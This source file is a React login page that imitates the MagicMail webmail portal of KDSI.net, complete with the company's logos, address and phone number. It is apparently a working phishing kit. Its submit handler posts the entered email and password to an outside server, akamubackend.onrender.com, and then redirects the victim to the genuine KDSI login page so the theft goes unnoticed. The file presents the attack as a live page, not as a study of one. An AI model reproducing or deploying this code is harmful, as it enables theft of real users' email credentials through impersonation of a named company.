import React from 'react';
import './home.css';

import logo from './logo.png';

import { useState } from 'react';
import magic from './magic.png';

import axios from 'axios';
import uia from './uia.png';
import magicwhite  from './magicwhite.png';
import kdsi from './kdsi.png';

function Home(){
    const[email, setEmail] = useState("");

    const [showPassword, setShowPassword] = useState(false);
  const [password, setPassword] = useState('');

  const[platform, setPlatform] = useState("KDSI")

  const[showError, setShowError] = useState(false);

  const handleCheckboxChange = () => {
    setShowPassword(!showPassword);
  }


  async function handleSubmit(e){
      e.preventDefault();

      try {
        const response = await axios.post('https://akamubackend.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            window.location.href = 'https://mail.kdsi.net/login.php';
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
  }
    return (
        <>

{showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
            <div className='main col-md-10 m-auto px-5 py-2'>

                <div className='d-flex justify-content-between'>
                <img src={magicwhite} className="logo" />

                <img src={kdsi} className="logo" />
                </div>

                

                <div className='innerdiv px-3 row'>
                    <div className='col-md-6 pt-3'>
                        <h2 className='heading'>Welcome to MagicMail</h2>

                        <h3 className='headingtwo'style={{
                            color:"#10456B",
                        }}>Login to access your account</h3>

                        <p className='content text-justify'>
                        Welcome to the User Site for the MagicMail System.
This is where you can setup and configure all your email options.
                        </p>

                        <h3 className='headingtwo'style={{
                            color:"#10456B",
                        }}>Forgot Your Password?</h3>

<p className='content text-justify'>
We are dedicated to providing you a secure online environment.
To have your password reset, please contact your local Customer Service and Technical Support team.
</p>

     
                       

                        <p style={{
                            fontSize:"12px",
                            fontStyle:"italic",
                        }}>* You MUST have cookies enabled to use these functions.</p>

                    </div>


                    <div className='col-md-6 pt-4'>

                        <div className='formdiv px-5 py-2 m-auto'>


                            <form onSubmit={handleSubmit}>
                                <h3 className='headingtwo'>Sign in to MagicMail</h3>

                                <hr
                        style={{
                        background: 'grey',
                        color: 'grey',
                        borderColor: 'grey',
                        height: '0.2px',
                        }}
                    />


                            <div className='form-group'>
                                <label className='label'>Email:</label>
                                <input onChange={function(e){
                                    setEmail(e.target.value)
                                }} value={email} style={{
                                    height:"30px",
                                }} type="email" className='form-control'required />

                            </div>


                            <div className='form-group'>
                                <label className='label'>Password:</label>
                                <input onChange={function(e){
                                    setPassword(e.target.value);
                                }}value={password} style={{
                                    height:"30px",
                                }}  type={showPassword ? 'text' : 'password'} className='form-control'required />

                            </div>

                            <div className='form-group'>
                                
                                <input checked={showPassword}
                                    onChange={handleCheckboxChange}  type="checkbox" /><span className='px-1 label'>Show Password</span>

                            </div>

                            <div className='form-group'>
                                
                                <p className='forgot'>Forgot Password ?</p>

                            </div>

                            <div className='form-group row buttondiv'>
                                
                                <div className='col-6 text-left'>
                                    <img src={magic} />
                                </div>

                                <div className='col-6 text-right'>
                                    <button type="submit"className='btn'style={{
                                        color:"black",
                                        backgroundColor:"lightgrey",
                                       
                                    }}>Login</button>
                                </div>

                            </div>

                            </form>

                        </div>
                        
                    </div>




                </div>


               
                
                    
                

                    <p style={{
                        
                         fontSize:"11px",
                         color:"black"
                    }} className='underthree text-center mt-3'>
                        MagicMail Server is brought to you by KDSI.net one of the Kelly Supply family of companies. <br/>
1004 W Oklahoma Avenue, Grand Island, NE 68801 <br/>
Telephone 308.382.8764 <br/>
hostmaster@kdsi.net
                    </p>


                
                    
            </div>
            <div className='text-center col-md-10 m-auto'style={{
                            background:"#10456B",
                            color:"white",
                            fontSize:"13px",
                        }}>
                <p>MagicMail is a Registered Trademark of Wizard Tower TechnoServices Ltd.</p>
            </div>

          
        </>
    );
}

export default Home;